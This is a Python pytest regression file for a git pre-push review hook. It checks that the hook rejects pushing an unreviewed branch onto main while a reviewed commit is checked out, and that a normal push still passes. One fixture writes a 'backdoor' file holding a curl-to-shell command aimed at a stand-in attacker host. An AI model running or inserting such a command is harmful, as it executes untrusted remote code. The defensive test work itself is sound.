"""RED1-1 regression (CRITICAL): hooks/pre-push used to recompute "the change" from the
pusher's ambient checked-out HEAD, never from the ref/sha git actually feeds the hook on
stdin (`<local ref> SP <local sha1> SP <remote ref> SP <remote sha1>`, githooks(5)). PoC
(see .ops-game/R1-red1-promotion.md, finding RED1-1): approve a trivial commit on `main`,
stay checked out on `main`, then `git push origin evilbranch:main` -- the unreviewed
`evilbranch` content lands on the remote ref with exit 0, because the hook only ever
checked whatever binding matched the CHECKED-OUT branch, independent of what bytes were
actually being transmitted.

These tests build a throwaway git repo under pytest's tmp_path (never touching the real
engine worktree's `.git`), invoke the REAL `hooks/pre-push` / `scripts/review-gate-binding.sh`
from this repo as subprocesses, and feed pre-push's stdin directly -- mirroring the
subprocess-driven pattern in tests/test_docker_config_guard.py /
tests/test_doctor_bootstrap_ip2.py.
"""
import os
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
PRE_PUSH = ROOT / "hooks" / "pre-push"


def _git(args: list[str], cwd: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _init_repo(path: Path, env: dict[str, str]) -> None:
    path.mkdir(parents=True, exist_ok=True)
    # Pin the initial branch name -- the git installation's `init.defaultBranch` is not
    # guaranteed to be "main" (this host defaults to "master"), and the whole scenario
    # depends on the reviewed/attack branches being named exactly "main"/"evilbranch".
    _git(["init", "-q", "-b", "main"], path, env)
    _git(["config", "user.email", "t@example.invalid"], path, env)
    _git(["config", "user.name", "T"], path, env)
    # `.omx/reviewer-state/` (where review_binding_record writes the verdict) is meant to be
    # gitignored in a real project (see docs/MULTI_AI_COLLABORATION.md); without this, the
    # verdict file itself is an untracked artifact that makes `git status --porcelain`
    # non-empty, which would make review_binding_dirty() misreport a freshly-committed,
    # actually-clean tree as "dirty" purely as a fixture artifact.
    (path / ".gitignore").write_text(".omx/\n", encoding="utf-8")


def _commit(path: Path, env: dict[str, str], filename: str, content: str, message: str) -> str:
    (path / filename).write_text(content, encoding="utf-8")
    _git(["add", "-A"], path, env)
    _git(["commit", "-q", "-m", message], path, env)
    return _git(["rev-parse", "HEAD"], path, env).stdout.strip()


def _base_env(tmp_path: Path) -> dict[str, str]:
    env = os.environ.copy()
    # Force the hook to source THIS repo's (fixed) scripts regardless of whatever
    # AI_AUTO_HOME happens to be set to in the ambient/session environment (e.g. a sibling
    # worktree of the same project) -- otherwise the test would silently exercise the
    # wrong engine copy.
    env["AI_AUTO_HOME"] = str(ROOT)
    home = tmp_path / "home"
    home.mkdir(parents=True, exist_ok=True)
    env["HOME"] = str(home)
    # Isolate the HMAC key from the real out-of-tree ~/.config/ai-auto/provenance.key
    # (RED1-3 territory) -- tests must never read or depend on that file.
    env["AI_AUTO_PROVENANCE_KEY_FILE"] = str(tmp_path / "provenance.key")
    return env


def _record_proceed_binding(project: Path, env: dict[str, str]) -> None:
    """Mirror exactly what review-gate.sh does on a human 'proceed' verdict: source the
    real binding helper and call review_binding_record while HEAD is whatever the caller
    currently has checked out."""
    script = (
        f". '{ROOT / 'scripts' / 'git-harden.sh'}'; "
        f". '{ROOT / 'scripts' / 'review-gate-binding.sh'}'; "
        "review_binding_record proceed normal test-verdict.md"
    )
    subprocess.run(
        ["bash", "-c", script],
        cwd=project,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _run_pre_push(project: Path, env: dict[str, str], stdin_text: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["bash", str(PRE_PUSH)],
        cwd=project,
        env=env,
        input=stdin_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )


def test_pre_push_rejects_unreviewed_ref_pushed_while_head_stays_elsewhere(tmp_path: Path) -> None:
    """The exact RED1-1 PoC: approve main, push evilbranch:main while sitting on main."""
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    _commit(project, env, "README.md", "hello\n", "init")
    main_sha = _commit(project, env, "app.py", "print('trivial safe change')\n", "clean reviewed commit")

    # Branch off, add an UNREVIEWED backdoor commit, then return to main -- the attacker
    # never checks evilbranch out again after creating it.
    _git(["branch", "evilbranch"], project, env)
    _git(["checkout", "-q", "evilbranch"], project, env)
    evil_sha = _commit(project, env, "backdoor.sh", "curl evil.example | sh\n", "evil unreviewed commit")
    _git(["checkout", "-q", "main"], project, env)
    assert _git(["rev-parse", "HEAD"], project, env).stdout.strip() == main_sha

    # Human approves while checked out on main -- binds to main's own reviewed content.
    _record_proceed_binding(project, env)

    # `git push origin evilbranch:main` while the ambient checkout is still `main`. git
    # feeds pre-push exactly this stdin line for that ref update.
    stdin = f"refs/heads/evilbranch {evil_sha} refs/heads/main {main_sha}\n"
    result = _run_pre_push(project, env, stdin)

    assert result.returncode != 0, (
        "pre-push accepted a pushed ref whose content was never reviewed, because it "
        f"only checked the ambient HEAD (RED1-1 regression). stdout={result.stdout!r} "
        f"stderr={result.stderr!r}"
    )


def test_pre_push_accepts_a_normal_push_of_the_actually_reviewed_commit(tmp_path: Path) -> None:
    """Non-vacuousness companion: an ordinary push of exactly what was reviewed (via a real
    upstream-tracked branch, so the recorded and re-derived hashes are computed the same
    way) must still be accepted -- the fix must check the ACTUAL pushed sha, not reject
    everything indiscriminately."""
    env = _base_env(tmp_path)
    bare = tmp_path / "origin.git"
    _git(["init", "-q", "--bare", str(bare)], tmp_path, env)

    project = tmp_path / "project"
    _init_repo(project, env)
    _git(["remote", "add", "origin", str(bare)], project, env)
    root_sha = _commit(project, env, "README.md", "hello\n", "init")
    _git(["push", "-q", "-u", "origin", "main"], project, env)

    main_sha = _commit(project, env, "app.py", "print('trivial safe change')\n", "clean reviewed commit")
    _record_proceed_binding(project, env)

    # The remote's main ref has not moved past root_sha yet -- exactly what `git push`
    # would report on pre-push's stdin for this fast-forward.
    stdin = f"refs/heads/main {main_sha} refs/heads/main {root_sha}\n"
    result = _run_pre_push(project, env, stdin)

    assert result.returncode == 0, f"stdout={result.stdout!r} stderr={result.stderr!r}"
